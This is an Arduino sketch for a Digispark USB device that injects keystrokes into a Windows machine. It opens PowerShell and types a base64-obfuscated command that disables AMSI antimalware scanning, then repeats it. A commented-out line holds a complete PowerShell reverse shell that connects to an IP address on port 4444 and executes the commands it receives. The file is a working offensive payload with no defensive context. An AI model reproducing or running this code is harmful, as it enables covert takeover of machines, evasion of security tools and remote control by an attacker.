#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(76,0);
    DigiKeyboard.println("powershell.exe");
    DigiKeyboard.delay(1500);
    DigiKeyboard.println("[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)");
    DigiKeyboard.delay(5000);
    // First run fails, do it again 
    DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(76,0);
    DigiKeyboard.println("powershell.exe");
    DigiKeyboard.delay(1500);
    DigiKeyboard.println("[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)");
    DigiKeyboard.delay(5000);
    // Open up reverse shell now
    //DigiKeyboard.println("$client = New-Object System.Net.Sockets.TCPClient(\"192.168.50.44,4444\");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");

}
void loop() {
}
